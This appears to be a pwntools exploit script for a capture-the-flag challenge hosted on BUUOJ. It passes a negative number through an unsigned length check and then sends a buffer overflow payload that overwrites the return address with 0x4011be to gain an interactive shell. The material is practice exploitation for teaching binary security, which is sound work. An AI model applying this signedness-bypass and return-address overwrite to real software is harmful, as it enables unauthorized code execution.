from pwn import *

io = remote('node4.buuoj.cn', 25048)
io.recvuntil(b'If you can find something is special,you are a half success!\n')
n = int.from_bytes((-48).to_bytes(4, 'little', signed=True), 'little', signed=False) # 4294967248
io.sendline(str(n))
payload = b'a'*(0x50+0x8)+p64(0x4011be)
io.sendlineafter(b'twice\n', payload)
io.interactive()